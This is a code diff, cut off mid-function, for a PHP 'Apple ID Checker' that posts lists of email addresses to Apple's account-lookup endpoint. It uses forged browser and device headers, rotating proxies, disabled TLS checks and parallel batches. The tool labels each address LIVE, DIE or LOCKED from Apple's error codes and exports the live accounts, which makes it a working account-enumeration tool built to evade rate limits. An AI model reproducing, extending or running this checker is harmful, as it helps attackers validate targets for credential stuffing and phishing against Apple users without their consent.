-    private function getSession(?string $proxy = null): array
-    {
-        $response = $this->httpRequest($this->initUrl, 'GET', null, [
-            'Accept: application/json, text/plain, */*',
-            'Accept-Language: ' . $this->acceptLanguage,
-            'Referer: https://appleid.apple.com/',
-            'Origin: https://appleid.apple.com',
-        ], $proxy);
-        
-        // Parse cookies dari response headers
-        $cookies = [];
-        foreach ($response['headers'] as $h) {
-            if (preg_match('/^Set-Cookie:\s*([^=]+)=([^;]+)/i', $h, $m)) {
-                $cookies[trim($m[1])] = trim($m[2]);
-            }
-        }
-        
-        // Parse scnt
-        $scnt = '';
-        foreach ($response['headers'] as $h) {
-            if (preg_match('/^scnt:\s*(.+)$/i', $h, $m)) {
-                $scnt = trim($m[1]);
-            }
-        }
-        
-        // Parse widget key dari body
-        $bodyData = json_decode($response['body'], true);
-        $widgetKey = $bodyData['widgetKey'] ?? 'd39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d';
-        
-        return [
-            'cookies' => $cookies,
-            'scnt' => $scnt,
-            'widgetKey' => $widgetKey,
-            'httpCode' => $response['http_code'],
-            'error' => $response['error'],
-        ];
-    }
-    
-    /**
-     * Check single email
-     */
-    public function check(string $email, ?string $proxy = null): array
-    {
-        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-            return [
-                'email' => $email,
-                'status' => 'ERROR',
-                'status_label' => 'Invalid Email Format',
-                'http_code' => 0,
-                'error_code' => null,
-                'message' => 'Email format is invalid',
-                'proxy_used' => $proxy,
-            ];
-        }
-        
-        $retryCount = 0;
-        $lastError = '';
-        
-        while ($retryCount <= $this->maxRetries) {
-            if ($this->useProxyRotation && $proxy === null) {
-                $proxy = $this->proxyGrabber->getNextProxy();
-                if ($proxy) {
-                    $this->stats['proxy_rotations']++;
-                }
-            }
-            
-            if ($this->verbose) {
-                $proxyInfo = $proxy ? " via " . parse_url($proxy, PHP_URL_HOST) : " (direct)";
-                echo "[DEBUG] Checking $email$proxyInfo (attempt " . ($retryCount + 1) . ")\n";
-            }
-            
-            try {
-                // Get session
-                $session = $this->getSession($proxy);
-                
-                // Build cookie string
-                $cookieStr = '';
-                foreach ($session['cookies'] as $name => $value) {
-                    $cookieStr .= "$name=$value; ";
-                }
-                $cookieStr = rtrim($cookieStr, '; ');
-                
-                $deviceId = $this->generateDeviceId();
-                $requestContext = $this->generateRequestContext();
-                $clientInfo = $this->getClientInfo();
-                
-                $headers = [
-                    'Accept: application/json, text/plain, */*',
-                    'Accept-Language: ' . $this->acceptLanguage,
-                    'Content-Type: application/json',
-                    'Referer: https://appleid.apple.com/',
-                    'Origin: https://appleid.apple.com',
-                    'Cookie: ' . $cookieStr,
-                    'X-Apple-I-FD-Client-Info: ' . $clientInfo,
-                    'X-Apple-Request-Context: ' . $requestContext,
-                    'X-Apple-I-Device-Id: ' . $deviceId,
-                    'X-Apple-Widget-Key: ' . $session['widgetKey'],
-                    'X-Requested-With: XMLHttpRequest',
-                ];
-                
-                if (!empty($session['scnt'])) {
-                    $headers[] = 'X-Apple-SCNT: ' . $session['scnt'];
-                }
-                
-                $payload = json_encode(['accountName' => $email]);
-                
-                $response = $this->httpRequest(
-                    $this->baseUrl,
-                    'POST',
-                    $payload,
-                    $headers,
-                    $proxy
-                );
-                
-                if (!empty($response['error'])) {
-                    $lastError = $response['error'];
-                    $retryCount++;
-                    if ($this->verbose) echo "[DEBUG] Error: {$response['error']}, retrying...\n";
-                    if ($this->useProxyRotation) {
-                        $proxy = $this->proxyGrabber->getNextProxy();
-                        $this->stats['proxy_rotations']++;
-                    }
-                    usleep(500000);
-                    continue;
-                }
-                
-                $data = json_decode($response['body'], true);
-                $result = $this->analyzeResponse($email, $response['http_code'], $data, $response['body'], $proxy);
-                
-                $this->stats['total']++;
-                switch ($result['status']) {
-                    case 'LIVE': $this->stats['live']++; break;
-                    case 'DIE': $this->stats['die']++; break;
-                    case 'LOCKED': $this->stats['locked']++; break;
-                    case 'ERROR': $this->stats['error']++; break;
-                    default: $this->stats['unknown']++; break;
-                }
-                
-                $this->results[] = $result;
-                return $result;
-                
-            } catch (\Exception $e) {
-                $lastError = $e->getMessage();
-                $retryCount++;
-                if ($this->verbose) echo "[DEBUG] Exception: " . $e->getMessage() . "\n";
-                if ($this->useProxyRotation) {
-                    $proxy = $this->proxyGrabber->getNextProxy();
-                    $this->stats['proxy_rotations']++;
-                }
-                usleep(500000);
-            }
-        }
-        
         $result = [
             'email' => $email,
             'status' => 'ERROR',
-            'status_label' => 'Max Retries',
+            'status_label' => 'Error',
             'http_code' => 0,
             'error_code' => null,
-            'message' => 'Failed: ' . $lastError,
-            'proxy_used' => $proxy,
-        ];
-        
-        $this->stats['total']++;
-        $this->stats['error']++;
-        $this->results[] = $result;
-        return $result;
-    }
-    
-    /**
-     * Analyze response
-     */
-    private function analyzeResponse(string $email, int $httpCode, ?array $data, string $rawResponse, ?string $proxy = null): array
-    {
-        $result = [
-            'email' => $email,
-            'status' => 'UNKNOWN',
-            'status_label' => 'Unknown',
-            'http_code' => $httpCode,
-            'error_code' => null,
             'message' => '',
-            'proxy_used' => $proxy,
+            'proxy' => $proxy,
         ];
-        
+
+        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+            $result['message'] = 'Invalid email';
+            return $result;
+        }
+
+        $ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15';
+        $fingerprint = substr(bin2hex(random_bytes(16)), 0, 32);
+
+        $commonHeaders = [
+            'Accept: application/json, text/plain, */*',
+            'Accept-Language: en-US,en;q=0.9',
+            'Accept-Encoding: identity',
+            'Referer: https://appleid.apple.com/',
+            'Origin: https://appleid.apple.com',
+            'User-Agent: ' . $ua,
+            'X-Apple-I-FD-Client-Info: {"U":"' . $ua . '","L":"en-US","Z":"GMT+07:00","V":"1.1","F":"' . $fingerprint . '"}',
+            'X-Apple-I-Device-Id: ' . $this->deviceId,
+            'X-Apple-Request-Context: ' . dechex(time()) . '-' . dechex(rand(1000, 9999)),
+            'X-Requested-With: XMLHttpRequest',
+        ];
+
+        // STEP 1: INIT SESSION
+        $ch = curl_init($this->initUrl);
+        $options = [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_HEADER => true,
+            CURLOPT_USERAGENT => $ua,
+            CURLOPT_HTTPHEADER => $commonHeaders,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_COOKIEFILE => '',
+            CURLOPT_COOKIEJAR => '',
+        ];
+
+        if ($proxy && $this->useProxy) {
+            $p = parse_url($proxy);
+            $options[CURLOPT_PROXY] = $p['host'] . ':' . ($p['port'] ?? 80);
+            $options[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
+        }
+
+        curl_setopt_array($ch, $options);
+        $response = curl_exec($ch);
+        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $respHeaders = substr($response, 0, $headerSize);
+        $respBody = substr($response, $headerSize);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+
+        if (!empty($error)) {
+            $result['message'] = "CURL Error: $error";
+            return $result;
+        }
+
+        preg_match_all('/^Set-Cookie:\s*([^=]+)=([^;]+)/mi', $respHeaders, $cm);
+        $cookies = [];
+        foreach ($cm[1] as $i => $n) {
+            $cookies[trim($n)] = trim($cm[2][$i]);
+        }
+
+        preg_match('/^scnt:\s*(.+)$/mi', $respHeaders, $sm);
+        $scnt = isset($sm[1]) ? trim($sm[1]) : '';
+
+        $bodyData = json_decode($respBody, true);
+        $widgetKey = $bodyData['widgetKey'] ?? 'd39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d';
+
+        $cookieStr = '';
+        foreach ($cookies as $n => $v) {
+            $cookieStr .= "$n=$v; ";
+        }
+        $cookieStr = rtrim($cookieStr, '; ');
+
+        // STEP 2: CHECK EMAIL
+        $checkHeaders = $commonHeaders;
+        $checkHeaders[] = 'Content-Type: application/json';
+        $checkHeaders[] = 'Cookie: ' . $cookieStr;
+        $checkHeaders[] = 'X-Apple-Widget-Key: ' . $widgetKey;
+        if ($scnt) {
+            $checkHeaders[] = 'X-Apple-SCNT: ' . $scnt;
+        }
+
+        $payload = json_encode(['accountName' => $email]);
+
+        $ch2 = curl_init($this->checkUrl);
+        $options2 = [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => $payload,
+            CURLOPT_USERAGENT => $ua,
+            CURLOPT_HTTPHEADER => $checkHeaders,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_CONNECTTIMEOUT => 10,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_HEADER => true,
+        ];
+
+        if ($proxy && $this->useProxy) {
+            $p = parse_url($proxy);
+            $options2[CURLOPT_PROXY] = $p['host'] . ':' . ($p['port'] ?? 80);
+            $options2[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
+        }
+
+        curl_setopt_array($ch2, $options2);
+        $response2 = curl_exec($ch2);
+        $headerSize2 = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
+        $respBody2 = substr($response2, $headerSize2);
+        $httpCode2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
+        $error2 = curl_error($ch2);
+        curl_close($ch2);
+
+        if (!empty($error2)) {
+            $result['message'] = "CURL Error: $error2";
+            $result['http_code'] = $httpCode2;
+            return $result;
+        }
+
+        $data = json_decode($respBody2, true);
+        $result['http_code'] = $httpCode2;
+
         if (isset($data['serviceErrors']) && is_array($data['serviceErrors'])) {
-            foreach ($data['serviceErrors'] as $error) {
-                $code = $error['code'] ?? '';
-                $msg = $error['message'] ?? '';
-                
+            foreach ($data['serviceErrors'] as $e) {
+                $code = $e['code'] ?? '';
+                $msg = $e['message'] ?? '';
+                $result['error_code'] = $code;
+
                 switch ($code) {
                     case '-20101':
                         $result['status'] = 'DIE';
-                        $result['status_label'] = 'Dead / Invalid';
-                        $result['error_code'] = '-20101';
+                        $result['status_label'] = 'Dead/Invalid';
                         $result['message'] = $msg ?: 'Account not found';
-                        return $result;
+                        break 2;
                     case '-20201':
                         $result['status'] = 'LIVE';
-                        $result['status_label'] = 'Live (2FA Required)';
-                        $result['error_code'] = '-20201';
-                        $result['message'] = $msg ?: 'Account exists, needs 2FA';
-                        return $result;
+                        $result['status_label'] = 'Live (2FA)';
+                        $result['message'] = $msg ?: 'Account exists, 2FA required';
+                        break 2;
                     case '-20283':
                         $result['status'] = 'LIVE';
-                        $result['status_label'] = 'Live (Trusted Device)';
-                        $result['error_code'] = '-20283';
+                        $result['status_label'] = 'Live (Trusted)';
                         $result['message'] = $msg ?: 'Account exists, trusted device';
-                        return $result;
+                        break 2;
                     case '-20751':
                         $result['status'] = 'LOCKED';
                         $result['status_label'] = 'Locked';
-                        $result['error_code'] = '-20751';
                         $result['message'] = $msg ?: 'Account locked';
-                        return $result;
+                        break 2;
                     default:
                         $result['status'] = 'UNKNOWN';
-                        $result['status_label'] = 'Unknown Error';
-                        $result['error_code'] = $code;
-                        $result['message'] = $msg ?: "Unknown code: $code";
-                        return $result;
+                        $result['status_label'] = "Code $code";
+                        $result['message'] = $msg ?: "Unknown code";
+                        break 2;
                 }
             }
+        } elseif ($httpCode2 === 200) {
+            $result['status'] = 'LIVE';
+            $result['status_label'] = 'Live (HTTP 200)';
+            $result['message'] = 'Account exists';
+        } elseif ($httpCode2 === 401) {
+            $result['status'] = 'DIE';
+            $result['status_label'] = 'Dead (401)';
+            $result['message'] = 'Unauthorized';
+        } elseif ($httpCode2 === 409) {
+            $result['status'] = 'LIVE';
+            $result['status_label'] = 'Live (Conflict)';
+            $result['message'] = 'Needs verification';
+        } elseif ($httpCode2 === 412) {
+            $result['status'] = 'LIVE';
+            $result['status_label'] = 'Live (Precondition)';
+            $result['message'] = 'No 2FA setup';
+        } elseif (in_array($httpCode2, [429, 503])) {
+            $result['status'] = 'ERROR';
+            $result['status_label'] = $httpCode2 === 429 ? 'Rate Limited' : 'Unavailable';
+            $result['message'] = "HTTP $httpCode2";
         }
-        
-        switch ($httpCode) {
-            case 200:
-                $result['status'] = 'LIVE';
-                $result['status_label'] = 'Live (HTTP 200)';
-                $result['message'] = 'Account exists';
-                break;
-            case 401: $result['status'] = 'DIE'; $result['status_label'] = 'Unauthorized'; break;
-            case 403: $result['status'] = 'DIE'; $result['status_label'] = 'Forbidden'; break;
-            case 409: $result['status'] = 'LIVE'; $result['status_label'] = 'Live (Conflict)'; break;
-            case 412: $result['status'] = 'LIVE'; $result['status_label'] = 'Live (No 2FA)'; break;
-            case 429: $result['status'] = 'ERROR'; $result['status_label'] = 'Rate Limited'; break;
-            case 503: $result['status'] = 'ERROR'; $result['status_label'] = 'Unavailable'; break;
-        }
-        
+
         return $result;
     }
-    
-    /**
-     * Check multiple emails
-     */
-    public function checkMultiple(array $emails, bool $autoGrabProxy = true): array
+
+    public function checkMultiple(array $emails): array
     {
-        if ($autoGrabProxy && $this->useProxyRotation && $this->proxyGrabber->getAvailableProxyCount() === 0) {
-            echo "[*] Auto-grabbing proxies...\n";
-            $proxies = $this->proxyGrabber->grabFromAllSources();
-            if (!empty($proxies)) {
-                echo "[*] Testing proxies...\n";
-                $this->proxyGrabber->testAllProxies($proxies);
-            }
-        }
-        
+        $this->startTime = microtime(true);
         $total = count($emails);
         $results = [];
-        $liveCount = 0;
-        $dieCount = 0;
-        
-        echo "\n[*] Memeriksa $total email...\n";
-        echo "[*] Proxy: " . $this->proxyGrabber->getAvailableProxyCount() . "\n";
-        echo str_repeat("=", 60) . "\n\n";
-        
-        foreach ($emails as $index => $email) {
-            $email = trim($email);
-            if (empty($email)) continue;
-            
-            $proxy = $this->useProxyRotation ? $this->proxyGrabber->getNextProxy() : null;
-            
-            $progress = sprintf("[%d/%d]", $index + 1, $total);
-            echo "$progress Checking: $email ... ";
-            
-            $result = $this->check($email, $proxy);
-            $results[] = $result;
-            
-            switch ($result['status']) {
-                case 'LIVE': $liveCount++; break;
-                case 'DIE': $dieCount++; break;
+
+        echo Colors::text("\n", Colors::RESET);
+        echo Colors::text(" ╔══════════════════════════════════════════════════════════╗\n", Colors::BCYAN);
+        echo Colors::text(" ║              APPLE ID CHECKER v4.0 - ULTRA             ║\n", Colors::BCYAN);
+        echo Colors::text(" ║               Author: HSFD 403 ── 2026                 ║\n", Colors::BCYAN);
+        echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n", Colors::BCYAN);
+
+        echo Colors::text("\n ┌─────────────────────────────────────────────────────────┐\n", Colors::ICYAN);
+        echo sprintf(" │ %-55s │\n", Colors::text(" Target: " . $total . " emails | Threads: " . $this->threads . " | Timeout: " . $this->timeout . "s", Colors::BWHITE));
+        echo sprintf(" │ %-55s │\n", Colors::text(" Proxy: " . ($this->useProxy ? "ACTIVE (" . $this->proxyGrabber->getAvailableCount() . " available)" : "DISABLED"), $this->useProxy ? Colors::IGREEN : Colors::IRED));
+        echo Colors::text(" └─────────────────────────────────────────────────────────┘\n", Colors::ICYAN);
+
+        $batches = array_chunk($emails, $this->threads);
+        $batchCount = count($batches);
+        $processedCount = 0;
+
+        foreach ($batches as $batchIndex => $batch) {
+            $mh = curl_multi_init();
+            $handles = [];
+
+            foreach ($batch as $i => $email) {
+                $email = trim($email);
+                if (empty($email)) continue;
+
+                $proxy = $this->useProxy ? $this->proxyGrabber->getNextProxy() : null;
+
+                $ch = curl_init($this->checkUrl);
+                curl_setopt_array($ch, [
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_POST => true,
+                    CURLOPT_POSTFIELDS => json_encode(['accountName' => $email]),
+                    CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+                    CURLOPT_HTTPHEADER => [
+                        'Accept: application/json',
+                        'Content-Type: application/json',
+                        'Referer: https://appleid.apple.com/',
+                        'X-Apple-Widget-Key: d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d',
+                    ],
+                    CURLOPT_TIMEOUT => $this->timeout,
+                    CURLOPT_CONNECTTIMEOUT => 10,
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_SSL_VERIFYHOST => false,
+                    CURLOPT_PRIVATE => json_encode(['email' => $email, 'proxy' => $proxy]),
+                ]);
+
+                if ($proxy && $this->useProxy) {
+                    $p = parse_url($proxy);
+                    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . ($p['port'] ?? 80));
+                    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+                }
+
+                curl_multi_add_handle($mh, $ch);
+                $handles[] = $ch;
             }
-            
-            $proxyInfo = $proxy ? " [via " . parse_url($proxy, PHP_URL_HOST) . "]" : "";
-            echo $result['status'] . " (" . $result['status_label'] . ")$proxyInfo\n";
-            
-            if ($index < $total - 1 && $this->delayBetweenRequests > 0) {
-                usleep($this->delayBetweenRequests);
+
+            if (empty($handles)) continue;
+
+            $running = null;
+            do {
+                curl_multi_exec($mh, $running);
+                curl_multi_select($mh);
+            } while ($running > 0);
+
+            $batchResults = [];
+            foreach ($handles as $ch) {
+                $response = curl_multi_getcontent($ch);
+                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                $error = curl_error($ch);
+                $private = json_decode(curl_getinfo($ch, CURLINFO_PRIVATE), true);
+                $email = $private['email'] ?? '';
+                $proxy = $private['proxy'] ?? null;
+
+                $result = [
+                    'email' => $email,
+                    'status' => 'ERROR',
+                    'status_label' => 'Error',
+                    'http_code' => $httpCode,
+                    'error_code' => null,
+                    'message' => $error ?: '',
+                    'proxy' => $proxy,
+                ];
+
+                if (!empty($error)) {
+                    $result['message'] = $error;
+                } else {
+                    $data = json_decode($response, true);
+                    if (isset($data['serviceErrors']) && is_array($data['serviceErrors'])) {
+                        foreach ($data['serviceErrors'] as $e) {
+                            $code = $e['code'] ?? '';
+                            $result['error_code'] = $code;
+                            switch ($code) {
+                                case '-20101':
+                                    $result['status'] = 'DIE';
+                                    $result['status_label'] = 'Dead/Invalid';
+                                    break 2;
+                                case '-20201':
+                                    $result['status'] = 'LIVE';
+                                    $result['status_label'] = 'Live (2FA)';
+                                    break 2;
+                                case '-20283':
+                                    $result['status'] = 'LIVE';
+                                    $result['status_label'] = 'Live (Trusted)';
+                                    break 2;
+                                case '-20751':
+                                    $result['status'] = 'LOCKED';
+                                    $result['status_label'] = 'Locked';
+                                    break 2;
+                                default:
+                                    $result['status'] = 'UNKNOWN';
+                                    $result['status_label'] = "Code $code";
+                                    break 2;
+                            }
+                        }
+                    } elseif ($httpCode === 200) {
+                        $result['status'] = 'LIVE';
+                        $result['status_label'] = 'Live (200)';
+                    } elseif ($httpCode === 401) {
+                        $result['status'] = 'DIE';
+                        $result['status_label'] = 'Dead (401)';
+                    } elseif ($httpCode === 409) {
+                        $result['status'] = 'LIVE';
+                        $result['status_label'] = 'Live (Conflict)';
+                    } elseif (in_array($httpCode, [429, 503])) {
+                        $result['status'] = 'ERROR';
+                        $result['status_label'] = $httpCode === 429 ? 'Rate Limit' : 'Unavailable';
+                    }
+                }
+
+                $batchResults[] = $result;
+
+                curl_multi_remove_handle($mh, $ch);
+                curl_close($ch);
             }
+
+            curl_multi_close($mh);
+
+            foreach ($batchResults as $r) {
+                switch ($r['status']) {
+                    case 'LIVE':
+                        $this->liveCount++;
+                        break;
+                    case 'DIE':
+                        $this->dieCount++;
+                        break;
+                    case 'LOCKED':
+                        $this->lockedCount++;
+                        break;
+                    case 'ERROR':
+                        $this->errorCount++;
+                        break;
+                    default:
+                        $this->unknownCount++;
+                        break;
+                }
+                $this->results[] = $r;
+            }
+
+            $processedCount += count($batchResults);
+            $this->displayBatchResults($batchResults, $processedCount, $total, $batchIndex + 1, $batchCount);
         }
-        
-        echo "\n" . str_repeat("=", 60) . "\n";
-        echo "[*] Selesai! LIVE: $liveCount | DIE: $dieCount\n";
-        
-        return $results;
+
+        $this->displayFinalSummary();
+        return $this->results;
     }
-    
-    public function checkFromFile(string $filePath, bool $autoGrabProxy = true): array
+
+    private function displayBatchResults(array $batchResults, int $processed, int $total, int $batchNum, int $totalBatches): void
     {
-        if (!file_exists($filePath)) {
-            throw new \Exception("File not found: $filePath");
+        $elapsed = microtime(true) - $this->startTime;
+        $speed = $processed / max($elapsed, 0.1);
+        $eta = $total > 0 ? ($total - $processed) / max($speed, 1) : 0;
+
+        if ($batchNum > 1) {
+            echo Colors::UP . str_repeat(Colors::CLEAR_LINE . Colors::UP, min(count($batchResults) + 3, 12));
         }
-        $emails = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-        $emails = array_map('trim', $emails);
-        return $this->checkMultiple($emails, $autoGrabProxy);
-    }
-    
-    public function getResults(): array { return $this->results; }
-    public function getStats(): array { return $this->stats; }
-    public function getLiveResults(): array { return array_filter($this->results, fn($r) => $r['status'] === 'LIVE'); }
-    public function getDieResults(): array { return array_filter($this->results, fn($r) => $r['status'] === 'DIE'); }
-    
-    public static function formatResults(array $results): string
-    {
-        $out = "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
-        $out .= sprintf("| %-33s | %-8s | %-26s | %-10s | %-20s |\n", "Email", "Status", "Label", "HTTP", "Proxy IP");
-        $out .= "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
-        
-        foreach ($results as $r) {
-            $pip = '';
-            if (!empty($r['proxy_used'])) {
-                $p = parse_url($r['proxy_used']);
-                $pip = $p['host'] ?? '';
-            }
-            $out .= sprintf("| %-33s | %-8s | %-26s | %-10s | %-20s |\n",
-                substr($r['email'], 0, 33),
-                $r['status'],
-                substr($r['status_label'], 0, 26),
-                $r['http_code'],
-                substr($pip, 0, 20)
+
+        echo Colors::CLEAR_LINE . Colors::text(" ┌─ BATCH $batchNum/$totalBatches ─────────────────────────────────────────┐\n", Colors::ICYAN);
+
+        $displayResults = array_slice($batchResults, 0, 8);
+        foreach ($displayResults as $r) {
+            $proxyInfo = $r['proxy'] ? ' [' . parse_url($r['proxy'], PHP_URL_HOST) . ']' : '';
+            echo Colors::CLEAR_LINE . sprintf(" │ %s %-30s %s %s\n",
+                Colors::status($r['status']),
+                substr($r['email'], 0, 30),
+                Colors::text($r['status_label'], $r['status'] === 'LIVE' ? Colors::IGREEN : ($r['status'] === 'DIE' ? Colors::IRED : Colors::IYELLOW)),
+                Colors::text($proxyInfo, Colors::IBLACK)
             );
         }
-        
-        $out .= "+" . str_repeat("-", 35) . "+" . str_repeat("-", 10) . "+" . str_repeat("-", 28) . "+" . str_repeat("-", 12) . "+" . str_repeat("-", 22) . "+\n";
-        return $out;
-    }
-    
-    public static function exportToCsv(array $results, string $path): bool
-    {
-        $fp = fopen($path, 'w');
-        if (!$fp) return false;
-        fwrite($fp, "\xEF\xBB\xBF");
-        fputcsv($fp, ['Email','Status','Label','HTTP Code','Error Code','Message','Proxy']);
-        foreach ($results as $r) {
-            fputcsv($fp, [$r['email'],$r['status'],$r['status_label'],$r['http_code'],$r['error_code']??'',$r['message'],$r['proxy_used']??'']);
+
+        $hidden = count($batchResults) - count($displayResults);
+        if ($hidden > 0) {
+            echo Colors::CLEAR_LINE . sprintf(" │ %s %s more results...\n",
+                str_repeat(' ', 7),
+                Colors::text("+$hidden", Colors::ICYAN)
+            );
         }
-        fclose($fp);
-        return true;
+
+        echo Colors::CLEAR_LINE . sprintf(" │ %s %s %s %s\n",
+            Colors::progressBar($processed, $total, 25),
+            Colors::text(sprintf("%.1f/s", $speed), Colors::BCYAN),
+            Colors::text("ETA: " . gmdate("i:s", $eta), Colors::BYELLOW),
+            Colors::text("Batch: $batchNum/$totalBatches", Colors::IBLACK)
+        );
+
+        echo Colors::CLEAR_LINE . Colors::text(" └─────────────────────────────────────────────────────────────────┘\n", Colors::ICYAN);
     }
-    
-    public static function exportToJson(array $results, string $path): bool
+
+    private function displayFinalSummary(): void
     {
-        return file_put_contents($path, json_encode($results, JSON_PRETTY_PRINT)) !== false;
+        $elapsed = microtime(true) - $this->startTime;
+        $speed = count($this->results) / max($elapsed, 0.1);
+
+        echo Colors::text("\n\n ╔══════════════════════════════════════════════════════════╗\n", Colors::BCYAN);
+        echo Colors::text(" ║                   FINAL SUMMARY                      ║\n", Colors::BCYAN);
+        echo Colors::text(" ╚══════════════════════════════════════════════════════════╝\n", Colors::BCYAN);
+
+        echo Colors::text("\n ┌─────────────────────────────────────────────────────────┐\n", Colors::ICYAN);
+        echo sprintf(" │ %-10s %s %-10s %s\n",
+            Colors::text("LIVE:", Colors::BGREEN . Colors::BWHITE),
+            Colors::text(str_pad($this->liveCount, 5), Colors::BIGREEN),
+            Colors::text("DIE:", Colors::BRED . Colors::BWHITE),
+            Colors::text($this->dieCount, Colors::BIRED)
+        );
+        echo sprintf(" │ %-10s %s %-10s %s\n",
+            Colors::text("LOCKED:", Colors::BYELLOW . Colors::BWHITE),
+            Colors::text(str_pad($this->lockedCount, 5), Colors::IYELLOW),
+            Colors::text("ERROR:", Colors::BPURPLE . Colors::BWHITE),
+            Colors::text($this->errorCount, Colors::IPURPLE)
+        );
+        echo sprintf(" │ %-24s %s\n",
+            Colors::text("TOTAL:", Colors::BCYAN . Colors::BWHITE),
+            Colors::text(count($this->results), Colors::BCYAN)
+        );
+        echo Colors::text(" ├─────────────────────────────────────────────────────────┤\n", Colors::ICYAN);
+        echo sprintf(" │ %-23s %s\n",
+            Colors::text("⏱  Time:", Colors::BWHITE),
+            Colors::text(gmdate("H:i:s", $elapsed), Colors::BCYAN)
+        );
+        echo sprintf(" │ %-23s %s/s\n",
+            Colors::text("⚡ Speed:", Colors::BWHITE),
+            Colors::text(number_format($speed, 1), Colors::BIGREEN)
+        );
+        echo sprintf(" │ %-23s %s\n",
+            Colors::text("📊 Accuracy:", Colors::BWHITE),
+            Colors::text(($this->liveCount + $this->dieCount) . "/" . count($this->results) . " (" . round(($this->liveCount + $this->dieCount) / max(count($this->results), 1) * 100) . "%)", Colors::BCYAN)
+        );
+        echo Colors::text(" └─────────────────────────────────────────────────────────┘\n", Colors::ICYAN);
+
+        echo Colors::text("\n ── " . Colors::text("HSFD 403", Colors::BRED) . " ── " . Colors::text("APPLE CHECKER v4.0", Colors::BCYAN) . " ──\n\n");
     }
-    
-    public static function exportToTxt(array $results, array $stats, string $path): bool
+
+    public function checkFromFile(string $path): array
     {
-        $live = count(array_filter($results, fn($r) => $r['status'] === 'LIVE'));
-        $die = count(array_filter($results, fn($r) => $r['status'] === 'DIE'));
-        $err = count(array_filter($results, fn($r) => $r['status'] === 'ERROR'));
-        
-        $txt = "APPLE ID CHECKER REPORT\n";
-        $txt .= str_repeat("=", 40) . "\n";
-        $txt .= "Date: " . date('Y-m-d H:i:s') . "\n";
-        $txt .= "Total: " . count($results) . " | LIVE: $live | DIE: $die | ERROR: $err\n\n";
-        $txt .= "--- LIVE ---\n";
-        foreach ($results as $r) {
-            if ($r['status'] === 'LIVE') {
-                $pi = !empty($r['proxy_used']) ? ' ['.parse_url($r['proxy_used'], PHP_URL_HOST).']' : '';
-                $txt .= $r['email'] . ' | ' . $r['status_label'] . $pi . "\n";
-            }
+        if (!file_exists($path)) throw new \Exception("File not found: $path");
+        $emails = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $emails = array_map('trim', $emails);
+
+        echo Colors::text(" [*] Loaded " . count($emails) . " emails from: $path\n", Colors::ICYAN);
+
+        return $this->checkMultiple($emails);
+    }
+
+    public function getResults(): array
+    {
+        return $this->results;
+    }
+
+    public function getStats(): array
+    {
+        return [
+            'total' => count($this->results),
+            'live' => $this->liveCount,
+            'die' => $this->dieCount,
+            'locked' => $this->lockedCount,
+            'error' => $this->errorCount,
+            'unknown' => $this->unknownCount,
+        ];
+    }
+
+    public function getLiveResults(): array
+    {
+        return array_filter($this->results, fn($r) => $r['status'] === 'LIVE');
+    }
+
+    public function saveResults(array $results, string $path, string $format = 'txt'): bool
+    {
+        switch ($format) {
+            case 'csv':
+                $fp = fopen($path, 'w');
+                if (!$fp) return false;
+                fwrite($fp, "\xEF\xBB\xBF");
+                fputcsv($fp, ['Email', 'Status', 'Label', 'HTTP Code', 'Error Code', 'Message', 'Proxy']);
+                foreach ($results as $r) {
+                    fputcsv($fp, [$r['email'], $r['status'], $r['status_label'], $r['http_code'], $r['error_code'] ?? '', $r['message'], $r['proxy'] ?? '']);
+                }
+                fclose($fp);
+                return true;
+
+            case 'json':
+                return file_put_contents($path, json_encode($results, JSON_PRETTY_PRINT)) !== false;
+
+            default:
+                $live = array_filter($results, fn($r) => $r['status'] === 'LIVE');
+                $txt = "APPLE CHECKER REPORT\n";
+                $txt .= "Author: HSFD 403\n";
+                $txt .= "Date: " . date('Y-m-d H:i:s') . "\n";
+                $txt .= "Total: " . count($results) . " | LIVE: " . count($live) . " | DIE: " . count(array_filter($results, fn($r) => $r['status'] === 'DIE')) . "\n\n";
+                $txt .= "=== LIVE ACCOUNTS ===\n";
+                foreach ($live as $r) {
+                    $pi = $r['proxy'] ? ' [' . parse_url($r['proxy'], PHP_URL_HOST) . ']' : '';
